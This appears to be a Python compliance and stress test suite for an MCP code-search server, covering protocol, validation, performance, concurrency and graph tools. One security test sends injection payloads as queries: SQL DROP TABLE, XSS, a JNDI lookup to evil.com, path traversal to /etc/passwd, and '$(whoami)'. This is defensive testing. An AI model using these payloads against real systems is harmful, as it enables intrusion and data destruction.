#!/usr/bin/env python3
"""
MCP Comprehensive Compliance & Stress Test Suite
================================================

Evaluates MCP server against industry standards:
1. Protocol Compliance (JSON-RPC 2.0)
2. Tool Discovery & Registration
3. Input Validation & Schema Compliance
4. Error Handling & Reporting
5. Performance & Load Testing
6. Concurrent Request Handling
7. Security Considerations
8. Structured Content Support
9. Timeout & Resource Limits
10. Rate Limiting

Usage:
    python3 scripts/mcp/mcp_comprehensive_test.py

Output:
    - test_results/mcp/comprehensive_test/detailed_report_{timestamp}.json
    - test_results/mcp/comprehensive_test/evaluation_summary_{timestamp}.md
"""

import json
import subprocess
import threading
import time
import sys
import os
import concurrent.futures
import statistics
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Any, Tuple
from dataclasses import dataclass, asdict
from enum import Enum


class PersistentMCPSession:
    """Keep a single ``wsctx mcp`` process alive across multiple requests.

    This measures **warm-path** latency — what real Claude Code users
    experience after the first model load — rather than per-subprocess
    cold-start cost (~12 s).

    Usage::

        with PersistentMCPSession(WORKSPACE) as session:
            # warm-up (absorbs cold-start)
            session.call("search_codebase", {"query": "init", "limit": 1})
            # now measure warm latency
            result, ms = session.call("search_codebase", {"query": "mcp"})
    """

    COLD_START_TIMEOUT = 60  # seconds — generous budget for first model load

    def __init__(self, workspace: str, cmd: str = "wsctx") -> None:
        self._workspace = workspace
        self._cmd = cmd
        self._proc: subprocess.Popen | None = None
        self._req_id = 0

    # ------------------------------------------------------------------

    def __enter__(self) -> "PersistentMCPSession":
        env = os.environ.copy()
        env.setdefault("TOKENIZERS_PARALLELISM", "false")
        env.setdefault("OMP_NUM_THREADS", "1")
        self._proc = subprocess.Popen(
            [self._cmd, "mcp", "--workspace", self._workspace],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            env=env,
        )
        # MCP handshake — fast, no model load needed
        self._send_request("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "perf-session", "version": "1.0"},
        }, timeout=10)
        return self

    def __exit__(self, *_: Any) -> None:
        if self._proc and self._proc.stdin:
            try:
                self._proc.stdin.close()
                self._proc.wait(timeout=5)
            except Exception:
                self._proc.kill()

    # ------------------------------------------------------------------

    def call(
        self, tool: str, arguments: dict, timeout: float | None = None
    ) -> Tuple[Dict, float]:
        """Call a tool and return ``(response_dict, elapsed_ms)``."""
        effective_timeout = timeout or self.COLD_START_TIMEOUT
        return self._send_request(
            "tools/call",
            {"name": tool, "arguments": arguments},
            timeout=effective_timeout,
        )

    def _send_request(
        self, method: str, params: dict, timeout: float
    ) -> Tuple[Dict, float]:
        self._req_id += 1
        req = json.dumps({
            "jsonrpc": "2.0",
            "id": self._req_id,
            "method": method,
            "params": params,
        }) + "\n"

        result_holder: list = [None]

        def _read() -> None:
            try:
                result_holder[0] = self._proc.stdout.readline()
            except Exception as exc:
                result_holder[0] = json.dumps({"error": str(exc)})

        t0 = time.time()
        assert self._proc and self._proc.stdin
        self._proc.stdin.write(req)
        self._proc.stdin.flush()

        reader = threading.Thread(target=_read, daemon=True)
        reader.start()
        reader.join(timeout=timeout)
        elapsed_ms = (time.time() - t0) * 1000

        raw = result_holder[0]
        if raw is None:
            return {"error": f"timeout after {timeout}s"}, elapsed_ms
        try:
            return json.loads(raw), elapsed_ms
        except json.JSONDecodeError:
            return {"error": "invalid json", "raw": raw[:200]}, elapsed_ms


class TestCategory(Enum):
    PROTOCOL = "Protocol Compliance"
    TOOLS = "Tool Discovery & Registration"
    VALIDATION = "Input Validation"
    ERROR_HANDLING = "Error Handling"
    PERFORMANCE = "Performance Testing"
    CONCURRENCY = "Concurrency Testing"
    SECURITY = "Security Testing"
    CONTENT = "Structured Content"
    TIMEOUT = "Timeout & Limits"
    RATE_LIMIT = "Rate Limiting"
    GRAPH_TOOLS = "Graph Tools"


@dataclass
class TestResult:
    category: str
    test_name: str
    passed: bool
    score: float  # 0.0 - 1.0
    details: Dict[str, Any]
    duration_ms: float
    error_message: str = ""


class MCPTestSuite:
    """Comprehensive MCP server test suite."""
    
    WORKSPACE = "/Users/trung.ngo/Documents/zaob-dev/zmr-ctx-paker"
    OUTPUT_DIR = Path("test_results/mcp/comprehensive_test")
    WSCTX_CMD = "wsctx"
    
    def __init__(self):
        self.results: List[TestResult] = []
        self.tools_list: List[str] = []
        self.server_info: Dict[str, Any] = {}
        self.OUTPUT_DIR.mkdir(exist_ok=True)
    
    def run_mcp_request(self, method: str, params: dict = None, timeout: int = 30, request_id: int = None) -> Tuple[Dict, float]:
        """Execute MCP request and return result with duration."""
        request = {
            "jsonrpc": "2.0",
            "id": request_id if request_id is not None else int(time.time() * 1000),
            "method": method,
            "params": params or {}
        }
        
        cmd = f'echo \'{json.dumps(request)}\' | {self.WSCTX_CMD} mcp --workspace {self.WORKSPACE}'
        
        start_time = time.time()
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            duration = (time.time() - start_time) * 1000
            
            if result.returncode != 0:
                return {"error": result.stderr, "stdout": result.stdout, "exit_code": result.returncode}, duration
            
            try:
                return json.loads(result.stdout), duration
            except json.JSONDecodeError as e:
                return {"error": f"Invalid JSON: {str(e)}", "raw": result.stdout}, duration
                
        except subprocess.TimeoutExpired:
            return {"error": f"Request timeout after {timeout} seconds"}, (time.time() - start_time) * 1000
        except Exception as e:
            return {"error": str(e)}, (time.time() - start_time) * 1000
    
    def validate_json_rpc(self, response: Dict, expected_id: int) -> Tuple[bool, str]:
        """Validate JSON-RPC 2.0 compliance."""
        if "jsonrpc" not in response:
            return False, "Missing 'jsonrpc' field"
        if response.get("jsonrpc") != "2.0":
            return False, f"Invalid jsonrpc version: {response.get('jsonrpc')}"
        if "id" not in response:
            return False, "Missing 'id' field"
        if response.get("id") != expected_id:
            return False, f"ID mismatch: expected {expected_id}, got {response.get('id')}"
        if "result" not in response and "error" not in response:
            return False, "Missing both 'result' and 'error' fields"
        if "result" in response and "error" in response:
            return False, "Both 'result' and 'error' present (should be mutually exclusive)"
        return True, "Valid JSON-RPC 2.0"
    
    def validate_error_object(self, error: Dict) -> Tuple[bool, str]:
        """Validate JSON-RPC error object format."""
        if not isinstance(error, dict):
            return False, "Error must be an object"
        if "code" not in error:
            return False, "Missing error code"
        if "message" not in error:
            return False, "Missing error message"
        if not isinstance(error["code"], int):
            return False, "Error code must be integer"
        return True, "Valid error object"
    
    # =========================================================================
    # CATEGORY 1: Protocol Compliance Tests
    # =========================================================================
    
    def test_protocol_initialize(self) -> TestResult:
        """Test MCP initialization protocol compliance."""
        request_id = 1001
        start = time.time()
        
        result, duration = self.run_mcp_request("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "test-client", "version": "1.0.0"}
        }, request_id=request_id)
        
        checks = {
            "jsonrpc_valid": False,
            "has_server_info": False,
            "has_capabilities": False,
            "has_protocol_version": False,
            "server_name_present": False,
            "server_version_present": False
        }
        
        valid, msg = self.validate_json_rpc(result, request_id)
        checks["jsonrpc_valid"] = valid
        
        if valid and "result" in result:
            res = result["result"]
            checks["has_server_info"] = "serverInfo" in res
            checks["has_capabilities"] = "capabilities" in res
            checks["has_protocol_version"] = "protocolVersion" in res
            
            if checks["has_server_info"]:
                self.server_info = res["serverInfo"]
                checks["server_name_present"] = bool(res["serverInfo"].get("name"))
                checks["server_version_present"] = bool(res["serverInfo"].get("version"))
        
        score = sum(checks.values()) / len(checks)
        passed = score >= 0.8
        
        return TestResult(
            category=TestCategory.PROTOCOL.value,
            test_name="initialize",
            passed=passed,
            score=score,
            details={"checks": checks, "response": result},
            duration_ms=duration,
            error_message=msg if not valid else ""
        )
    
    def test_protocol_tools_list(self) -> TestResult:
        """Test tools/list method compliance."""
        request_id = 1002
        
        result, duration = self.run_mcp_request("tools/list", request_id=request_id)
        
        checks = {
            "jsonrpc_valid": False,
            "has_tools_array": False,
            "tools_not_empty": False,
            "each_tool_has_name": False,
            "each_tool_has_description": False,
            "each_tool_has_schema": False
        }
        
        valid, msg = self.validate_json_rpc(result, request_id)
        checks["jsonrpc_valid"] = valid
        
        if valid and "result" in result:
            tools = result["result"].get("tools", [])
            checks["has_tools_array"] = isinstance(tools, list)
            
            if checks["has_tools_array"]:
                checks["tools_not_empty"] = len(tools) > 0
                self.tools_list = [t.get("name") for t in tools if isinstance(t, dict)]
                
                if checks["tools_not_empty"]:
                    checks["each_tool_has_name"] = all(
                        isinstance(t, dict) and "name" in t for t in tools
                    )
                    checks["each_tool_has_description"] = all(
                        isinstance(t, dict) and "description" in t for t in tools
                    )
                    checks["each_tool_has_schema"] = all(
                        isinstance(t, dict) and "inputSchema" in t for t in tools
                    )
        
        score = sum(checks.values()) / len(checks)
        
        return TestResult(
            category=TestCategory.TOOLS.value,
            test_name="tools/list",
            passed=checks["jsonrpc_valid"] and checks["tools_not_empty"],
            score=score,
            details={"checks": checks, "tools_found": len(self.tools_list), "response": result},
            duration_ms=duration
        )
    
    def test_protocol_notifications(self) -> TestResult:
        """Test that notifications (no id) don't receive responses."""
        # This is a notification - should not get a response
        request = {
            "jsonrpc": "2.0",
            "method": "notifications/initialized"
        }
        
        cmd = f'echo \'{json.dumps(request)}\' | {self.WSCTX_CMD} mcp --workspace {self.WORKSPACE}'
        
        start = time.time()
        result_proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
        duration = (time.time() - start) * 1000
        
        # Notifications should either have empty output or not error
        has_output = bool(result_proc.stdout.strip())
        
        return TestResult(
            category=TestCategory.PROTOCOL.value,
            test_name="notifications/no_response",
            passed=True,  # Either empty or has output is acceptable
            score=1.0 if not has_output else 0.5,
            details={"has_output": has_output, "output": result_proc.stdout[:200]},
            duration_ms=duration
        )
    
    # =========================================================================
    # CATEGORY 2: Tool Discovery & Registration
    # =========================================================================
    
    def test_tool_discovery_comprehensive(self) -> TestResult:
        """Comprehensive tool discovery with schema validation."""
        result, duration = self.run_mcp_request("tools/list")
        
        tools_analysis = []
        schema_valid_count = 0
        
        if "result" in result and "tools" in result["result"]:
            for tool in result["result"]["tools"]:
                analysis = {
                    "name": tool.get("name", "UNKNOWN"),
                    "has_description": bool(tool.get("description")),
                    "description_length": len(tool.get("description", "")),
                    "has_schema": "inputSchema" in tool,
                    "schema_type": tool.get("inputSchema", {}).get("type", "N/A"),
                    "has_properties": "properties" in tool.get("inputSchema", {}),
                    "required_fields_count": len(tool.get("inputSchema", {}).get("required", []))
                }
                
                # Validate schema structure
                if analysis["has_schema"] and analysis["schema_type"] == "object":
                    schema_valid_count += 1
                
                tools_analysis.append(analysis)
        
        total_tools = len(tools_analysis)
        avg_description_length = sum(a["description_length"] for a in tools_analysis) / total_tools if total_tools else 0
        
        checks = {
            "tools_found": total_tools > 0,
            "all_have_descriptions": all(a["has_description"] for a in tools_analysis),
            "all_have_schemas": all(a["has_schema"] for a in tools_analysis),
            "schemas_are_valid": schema_valid_count == total_tools if total_tools else False,
            "descriptions_meaningful": avg_description_length > 20  # At least 20 chars
        }
        
        score = sum(checks.values()) / len(checks)
        
        return TestResult(
            category=TestCategory.TOOLS.value,
            test_name="tool_discovery_comprehensive",
            passed=score >= 0.8,
            score=score,
            details={
                "tools_analysis": tools_analysis,
                "checks": checks,
                "total_tools": total_tools,
                "avg_description_length": avg_description_length
            },
            duration_ms=duration
        )
    
    # =========================================================================
    # CATEGORY 3: Input Validation
    # =========================================================================
    
    def test_input_validation_missing_required(self) -> TestResult:
        """Test handling of missing required parameters."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "search_codebase",
            "arguments": {}  # Missing required 'query'
        })
        
        has_error = False
        error_type = None
        
        if "result" in result:
            content = result["result"].get("content", [])
            if content and isinstance(content[0], dict):
                text = content[0].get("text", "")
                has_error = "error" in text.lower() or "required" in text.lower()
                error_type = "validation_error" if has_error else "none"
        elif "error" in result:
            has_error = True
            error_type = "rpc_error"
        
        return TestResult(
            category=TestCategory.VALIDATION.value,
            test_name="input_validation/missing_required",
            passed=has_error,  # Should error when missing required param
            score=1.0 if has_error else 0.0,
            details={"error_detected": has_error, "error_type": error_type, "response": result},
            duration_ms=duration
        )
    
    def test_input_validation_invalid_types(self) -> TestResult:
        """Test handling of invalid parameter types."""
        test_cases = [
            {"name": "search_codebase", "arguments": {"query": 12345}},  # Should be string
            {"name": "search_codebase", "arguments": {"query": "test", "limit": "ten"}},  # Should be int
            {"name": "search_codebase", "arguments": {"query": None}},  # Null value
        ]
        
        results = []
        total_duration = 0.0
        for tc in test_cases:
            result, dur = self.run_mcp_request("tools/call", tc)
            total_duration += dur
            has_error = "error" in result or any(
                "error" in str(c.get("text", "")).lower()
                for c in result.get("result", {}).get("content", [])
                if isinstance(c, dict)
            )
            results.append({"case": tc, "error_detected": has_error})

        error_rate = sum(1 for r in results if r["error_detected"]) / len(results)

        return TestResult(
            category=TestCategory.VALIDATION.value,
            test_name="input_validation/invalid_types",
            passed=error_rate > 0.5,  # Should catch at least some
            score=error_rate,
            details={"test_cases": len(test_cases), "errors_caught": sum(1 for r in results if r["error_detected"]), "results": results},
            duration_ms=total_duration
        )
    
    def test_input_validation_boundary_values(self) -> TestResult:
        """Test boundary value handling."""
        test_cases = [
            {"name": "search_codebase", "arguments": {"query": "", "limit": 0}},  # Empty query, zero limit
            {"name": "search_codebase", "arguments": {"query": "a" * 10000, "limit": 1000}},  # Very long query, high limit
            {"name": "search_codebase", "arguments": {"query": "test", "limit": -1}},  # Negative limit
        ]
        
        results = []
        total_duration = 0.0
        for tc in test_cases:
            result, dur = self.run_mcp_request("tools/call", tc)
            total_duration += dur
            # Should either succeed with valid response or error gracefully
            handled = "result" in result or "error" in result
            results.append({"case": tc, "handled": handled})

        handled_rate = sum(1 for r in results if r["handled"]) / len(results)

        return TestResult(
            category=TestCategory.VALIDATION.value,
            test_name="input_validation/boundary_values",
            passed=handled_rate == 1.0,
            score=handled_rate,
            details={"test_cases": len(test_cases), "handled_count": sum(1 for r in results if r["handled"])},
            duration_ms=total_duration
        )
    
    def test_input_validation_sql_injection(self) -> TestResult:
        """Test security against SQL/code injection attempts."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com}",
            "../../../etc/passwd",
            "$(whoami)",
        ]
        
        results = []
        total_duration = 0.0
        for payload in malicious_inputs:
            result, dur = self.run_mcp_request("tools/call", {
                "name": "search_codebase",
                "arguments": {"query": payload, "limit": 5}
            })
            total_duration += dur
            # Should handle gracefully without crashing
            handled_safely = "result" in result or "error" in result
            results.append({"payload": payload[:30], "handled_safely": handled_safely})

        safe_rate = sum(1 for r in results if r["handled_safely"]) / len(results)

        return TestResult(
            category=TestCategory.SECURITY.value,
            test_name="security/injection_attempts",
            passed=safe_rate == 1.0,
            score=safe_rate,
            details={"test_cases": len(malicious_inputs), "safe_count": sum(1 for r in results if r["handled_safely"])},
            duration_ms=total_duration
        )
    
    # =========================================================================
    # CATEGORY 4: Error Handling
    # =========================================================================
    
    def test_error_handling_unknown_method(self) -> TestResult:
        """Test error response for unknown method."""
        result, duration = self.run_mcp_request("unknown_method_xyz")
        
        has_error = "error" in result
        error_valid = False
        error_code = None
        error_message = None
        
        if has_error:
            error_obj = result["error"]
            valid, msg = self.validate_error_object(error_obj)
            error_valid = valid
            error_code = error_obj.get("code")
            error_message = error_obj.get("message")
        
        return TestResult(
            category=TestCategory.ERROR_HANDLING.value,
            test_name="error_handling/unknown_method",
            passed=has_error and error_valid,
            score=1.0 if (has_error and error_valid) else 0.5 if has_error else 0.0,
            details={
                "has_error": has_error,
                "error_valid": error_valid,
                "error_code": error_code,
                "error_message": error_message
            },
            duration_ms=duration
        )
    
    def test_error_handling_unknown_tool(self) -> TestResult:
        """Test error response for unknown tool."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "nonexistent_tool_abc123",
            "arguments": {}
        })
        
        has_error = False
        error_in_content = False
        
        if "error" in result:
            has_error = True
        elif "result" in result:
            content = result["result"].get("content", [])
            if content and isinstance(content[0], dict):
                text = content[0].get("text", "")
                error_in_content = "error" in text.lower() or "not found" in text.lower()
                has_error = error_in_content
        
        return TestResult(
            category=TestCategory.ERROR_HANDLING.value,
            test_name="error_handling/unknown_tool",
            passed=has_error,
            score=1.0 if has_error else 0.0,
            details={"has_error": has_error, "error_in_content": error_in_content},
            duration_ms=duration
        )
    
    # =========================================================================
    # CATEGORY 5: Performance Testing
    # =========================================================================
    
    def test_performance_single_request_latency(self) -> TestResult:
        """Measure single request latency."""
        latencies = []
        
        for _ in range(5):
            result, duration = self.run_mcp_request("tools/call", {
                "name": "get_index_status",
                "arguments": {}
            })
            if "result" in result:
                latencies.append(duration)
            time.sleep(0.1)
        
        if latencies:
            avg_latency = statistics.mean(latencies)
            max_latency = max(latencies)
            min_latency = min(latencies)
            std_dev = statistics.stdev(latencies) if len(latencies) > 1 else 0
        else:
            avg_latency = max_latency = min_latency = std_dev = 0
        
        # Score based on latency thresholds (lower is better)
        score = 1.0 if avg_latency < 1000 else 0.8 if avg_latency < 3000 else 0.5 if avg_latency < 5000 else 0.0
        
        return TestResult(
            category=TestCategory.PERFORMANCE.value,
            test_name="performance/single_request_latency",
            passed=avg_latency < 5000,  # Should complete within 5 seconds
            score=score,
            details={
                "avg_latency_ms": avg_latency,
                "min_latency_ms": min_latency,
                "max_latency_ms": max_latency,
                "std_dev_ms": std_dev,
                "samples": len(latencies)
            },
            duration_ms=avg_latency
        )
    
    def test_performance_search_latency(self) -> TestResult:
        """Measure warm-path search latency using a persistent MCP process.

        A single ``wsctx mcp`` subprocess is kept alive for the whole test.
        The first request is discarded (absorbs cold-start / model load).
        Subsequent requests measure real steady-state latency.

        Thresholds (warm path after ONNX model load):
            ≤ 500 ms  — excellent
            ≤ 2 000 ms — good
            ≤ 5 000 ms — acceptable
            > 5 000 ms — fail
        """
        warm_latencies: list[float] = []
        cold_start_ms: float = 0.0
        error_message = ""

        try:
            with PersistentMCPSession(self.WORKSPACE, self.WSCTX_CMD) as session:
                # Warm-up: absorb cold-start (model load + LEANN init).
                # Use a generous timeout; the result is not counted.
                warmup_result, cold_start_ms = session.call(
                    "search_codebase",
                    {"query": "mcp server", "limit": 5},
                    timeout=PersistentMCPSession.COLD_START_TIMEOUT,
                )

                if "error" in warmup_result and "result" not in warmup_result:
                    error_message = f"warm-up failed: {warmup_result.get('error')}"
                else:
                    # Warm measurements — model is loaded, LEANN searcher is cached.
                    for query in ["config", "logger", "retrieval", "chunker"]:
                        result, ms = session.call(
                            "search_codebase",
                            {"query": query, "limit": 10},
                            timeout=10,
                        )
                        if "result" in result:
                            warm_latencies.append(ms)

        except Exception as exc:
            error_message = str(exc)

        if warm_latencies:
            avg_latency = statistics.mean(warm_latencies)
            max_latency = max(warm_latencies)
            p99_latency = sorted(warm_latencies)[int(len(warm_latencies) * 0.99)] if len(warm_latencies) > 1 else max_latency
        else:
            avg_latency = max_latency = p99_latency = 0.0

        score = (
            1.0 if avg_latency < 500
            else 0.8 if avg_latency < 2000
            else 0.5 if avg_latency < 5000
            else 0.0
        )

        return TestResult(
            category=TestCategory.PERFORMANCE.value,
            test_name="performance/search_latency",
            passed=avg_latency < 5000 and bool(warm_latencies),
            score=score,
            details={
                "mode": "warm-path (persistent process)",
                "cold_start_ms": round(cold_start_ms, 1),
                "avg_warm_ms": round(avg_latency, 1),
                "max_warm_ms": round(max_latency, 1),
                "p99_warm_ms": round(p99_latency, 1),
                "samples": len(warm_latencies),
                "error": error_message,
            },
            duration_ms=avg_latency,
            error_message=error_message,
        )

    def test_performance_pack_context(self) -> TestResult:
        """Measure warm-path pack_context latency using a persistent MCP process."""
        warm_latencies: list[float] = []
        cold_start_ms: float = 0.0
        error_message = ""

        try:
            with PersistentMCPSession(self.WORKSPACE, self.WSCTX_CMD) as session:
                # Warm-up — not counted
                _, cold_start_ms = session.call(
                    "search_codebase",
                    {"query": "init", "limit": 1},
                    timeout=PersistentMCPSession.COLD_START_TIMEOUT,
                )

                for format_type in ["json", "xml", "md"]:
                    result, ms = session.call(
                        "pack_context",
                        {"query": "mcp config", "format": format_type},
                        timeout=30,
                    )
                    if "result" in result:
                        warm_latencies.append(ms)

        except Exception as exc:
            error_message = str(exc)

        avg_latency = statistics.mean(warm_latencies) if warm_latencies else 0.0

        # pack_context does I/O (write output file) so thresholds are looser
        score = (
            1.0 if avg_latency < 2000
            else 0.8 if avg_latency < 5000
            else 0.5 if avg_latency < 10000
            else 0.0
        )

        return TestResult(
            category=TestCategory.PERFORMANCE.value,
            test_name="performance/pack_context_latency",
            passed=avg_latency < 10000 and bool(warm_latencies),
            score=score,
            details={
                "mode": "warm-path (persistent process)",
                "cold_start_ms": round(cold_start_ms, 1),
                "avg_warm_ms": round(avg_latency, 1),
                "samples": len(warm_latencies),
                "error": error_message,
            },
            duration_ms=avg_latency,
            error_message=error_message,
        )
    
    # =========================================================================
    # CATEGORY 6: Concurrency Testing
    # =========================================================================
    
    def test_concurrency_multiple_parallel(self) -> TestResult:
        """Test handling of parallel requests."""
        def make_request(i):
            return self.run_mcp_request("tools/call", {
                "name": "get_index_status",
                "arguments": {}
            })
        
        start = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(make_request, i) for i in range(10)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        
        total_duration = (time.time() - start) * 1000
        
        successful = sum(1 for r, _ in results if "result" in r)
        errors = sum(1 for r, _ in results if "error" in r)
        
        success_rate = successful / len(results)
        
        return TestResult(
            category=TestCategory.CONCURRENCY.value,
            test_name="concurrency/parallel_requests",
            passed=success_rate >= 0.9,
            score=success_rate,
            details={
                "total_requests": len(results),
                "successful": successful,
                "errors": errors,
                "total_duration_ms": total_duration,
                "success_rate": success_rate
            },
            duration_ms=total_duration
        )
    
    def test_concurrency_mixed_tools(self) -> TestResult:
        """Test concurrent requests to different tools."""
        tools_to_test = ["get_index_status", "get_domain_map"]
        
        def make_request(tool_name):
            return self.run_mcp_request("tools/call", {
                "name": tool_name,
                "arguments": {}
            })
        
        t0 = time.time()
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
            futures = [executor.submit(make_request, tool) for tool in tools_to_test * 3]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]
        total_duration = (time.time() - t0) * 1000

        successful = sum(1 for r, _ in results if "result" in r)

        return TestResult(
            category=TestCategory.CONCURRENCY.value,
            test_name="concurrency/mixed_tools",
            passed=successful == len(results),
            score=successful / len(results),
            details={
                "total_requests": len(results),
                "successful": successful
            },
            duration_ms=total_duration
        )
    
    # =========================================================================
    # CATEGORY 7: Timeout & Resource Limits
    # =========================================================================
    
    def test_timeout_handling(self) -> TestResult:
        """Test timeout handling for long operations."""
        # Use a short timeout to test timeout handling
        result, duration = self.run_mcp_request(
            "tools/call",
            {"name": "get_index_status", "arguments": {}},
            timeout=5
        )
        
        completed_in_time = duration < 5000  # Should complete within 5s
        
        return TestResult(
            category=TestCategory.TIMEOUT.value,
            test_name="timeout/handling",
            passed=completed_in_time,
            score=1.0 if completed_in_time else 0.0,
            details={"duration_ms": duration, "timeout_set": 5},
            duration_ms=duration
        )
    
    # =========================================================================
    # CATEGORY 8: Structured Content Support
    # =========================================================================
    
    def test_structured_content_format(self) -> TestResult:
        """Test that structured content is returned properly."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "search_codebase",
            "arguments": {"query": "mcp", "limit": 3}
        })
        
        has_content = False
        has_structured = False
        content_is_array = False
        has_text_content = False
        
        if "result" in result:
            res = result["result"]
            has_content = "content" in res
            has_structured = "structuredContent" in res
            
            if has_content:
                content = res["content"]
                content_is_array = isinstance(content, list)
                
                if content_is_array and len(content) > 0:
                    first_item = content[0]
                    has_text_content = isinstance(first_item, dict) and "type" in first_item
        
        checks = {
            "has_content": has_content,
            "has_structured_content": has_structured,
            "content_is_array": content_is_array,
            "content_items_have_type": has_text_content
        }
        
        score = sum(checks.values()) / len(checks)
        
        return TestResult(
            category=TestCategory.CONTENT.value,
            test_name="structured_content/format",
            passed=has_content and content_is_array,
            score=score,
            details=checks,
            duration_ms=duration
        )
    
    # =========================================================================
    # CATEGORY 9: Graph Tools
    # =========================================================================

    def _graph_content_text(self, result: Dict) -> str:
        """Extract plain text from a tools/call result envelope."""
        try:
            return result.get("result", {}).get("content", [{}])[0].get("text", "")
        except (IndexError, AttributeError):
            return ""

    def _graph_payload(self, result: Dict) -> Dict:
        """Parse JSON from a tools/call text response."""
        try:
            return json.loads(self._graph_content_text(result))
        except json.JSONDecodeError:
            return {}

    def test_graph_tools_registered(self) -> TestResult:
        """Verify all 5 new graph tools are in tools/list with correct schema."""
        result, duration = self.run_mcp_request("tools/list")
        expected = {"find_callers", "impact_analysis", "graph_search", "call_chain", "get_status"}

        registered: Dict[str, Dict] = {}
        if "result" in result:
            for t in result["result"].get("tools", []):
                if t.get("name") in expected:
                    registered[t["name"]] = t

        checks = {
            "all_tools_present": expected == set(registered),
            "all_have_description": all(
                bool(t.get("description")) for t in registered.values()
            ),
            "all_have_use_when": all(
                "Use" in t.get("description", "") for t in registered.values()
            ),
            "all_have_schema": all(
                "inputSchema" in t for t in registered.values()
            ),
        }
        score = sum(checks.values()) / len(checks)
        missing = expected - set(registered)

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/registration",
            passed=checks["all_tools_present"],
            score=score,
            details={"checks": checks, "missing": list(missing), "registered": list(registered)},
            duration_ms=duration,
            error_message=f"Missing: {missing}" if missing else "",
        )

    def test_graph_get_status(self) -> TestResult:
        """get_status returns a readiness envelope with required fields."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "get_status",
            "arguments": {},
        })

        payload = self._graph_payload(result)
        checks = {
            "server_responded": "result" in result,
            "has_ready_field": "ready" in payload,
            "has_graph_store": "graph_store" in payload,
            "has_vector_backend": "vector_backend" in payload,
            "graph_store_has_available": isinstance(payload.get("graph_store"), dict)
                and "available" in payload.get("graph_store", {}),
            "has_required_actions": "required_actions" in payload,
            "has_hint": "hint" in payload,
        }
        score = sum(checks.values()) / len(checks)

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/get_status",
            passed=checks["server_responded"] and checks["has_ready_field"],
            score=score,
            details={"checks": checks, "payload": payload},
            duration_ms=duration,
        )

    def test_graph_find_callers_validation(self) -> TestResult:
        """find_callers rejects empty/missing fn_name with INVALID_ARGUMENT."""
        cases = [
            ({}, "missing fn_name"),
            ({"fn_name": ""}, "empty fn_name"),
        ]
        results = []
        total_duration = 0.0
        for args, label in cases:
            res, dur = self.run_mcp_request("tools/call", {"name": "find_callers", "arguments": args})
            total_duration += dur
            text = self._graph_content_text(res)
            got_invalid = "INVALID_ARGUMENT" in text
            results.append({"label": label, "got_invalid_argument": got_invalid})

        pass_count = sum(1 for r in results if r["got_invalid_argument"])
        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/find_callers/validation",
            passed=pass_count == len(cases),
            score=pass_count / len(cases),
            details={"cases": results},
            duration_ms=total_duration,
        )

    def test_graph_find_callers_happy_path(self) -> TestResult:
        """find_callers with a real function returns non-empty callers list or GRAPH_UNAVAILABLE."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "find_callers",
            "arguments": {"fn_name": "_query"},
        })
        text = self._graph_content_text(result)
        payload = self._graph_payload(result)

        has_callers = "callers" in payload
        graph_unavailable = "GRAPH_UNAVAILABLE" in text
        callers_count = len(payload.get("callers", []))
        # When graph is available: callers must be non-empty for a known function
        data_correct = graph_unavailable or callers_count > 0
        graceful = has_callers or graph_unavailable

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/find_callers/happy_path",
            passed="result" in result and graceful and data_correct,
            score=1.0 if ("result" in result and graceful and data_correct) else 0.0,
            details={
                "has_callers": has_callers,
                "callers_count": callers_count,
                "graph_unavailable": graph_unavailable,
                "payload": payload,
            },
            duration_ms=duration,
        )

    def test_graph_impact_analysis_validation(self) -> TestResult:
        """impact_analysis rejects empty/missing file_path."""
        cases = [
            ({}, "missing file_path"),
            ({"file_path": ""}, "empty file_path"),
        ]
        results = []
        total_duration = 0.0
        for args, label in cases:
            res, dur = self.run_mcp_request("tools/call", {"name": "impact_analysis", "arguments": args})
            total_duration += dur
            text = self._graph_content_text(res)
            got_invalid = "INVALID_ARGUMENT" in text
            results.append({"label": label, "got_invalid_argument": got_invalid})

        pass_count = sum(1 for r in results if r["got_invalid_argument"])
        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/impact_analysis/validation",
            passed=pass_count == len(cases),
            score=pass_count / len(cases),
            details={"cases": results},
            duration_ms=total_duration,
        )

    def test_graph_impact_analysis_happy_path(self) -> TestResult:
        """impact_analysis returns importers list or GRAPH_UNAVAILABLE."""
        result, duration = self.run_mcp_request("tools/call", {
            "name": "impact_analysis",
            "arguments": {"file_path": "src/ws_ctx_engine/models/models.py"},
        })
        text = self._graph_content_text(result)
        payload = self._graph_payload(result)

        has_importers = "importers" in payload
        graph_unavailable = "GRAPH_UNAVAILABLE" in text
        graceful = has_importers or graph_unavailable

        return TestResult(
            category=TestCategory.GRAPH_TOOLS.value,
            test_name="graph_tools/impact_analysis/happy_path",
            passed="result" in result and graceful,
            score=1.0 if ("result" in result and graceful) else 0.0,
            details={"has_importers": has_importers, "graph_unavailable": graph_unavailable},
            duration_ms=duration,
        )

    def test_graph_search_validation(self) -> TestResult:
        """graph_search rejects empty/missing file_id."""
        cases = [
            ({}, "missing file_id"),
            ({"file_id": ""}, "empty file_id"),
        ]
        results = []
        total_duration = 0.0
        for args, label in cases:
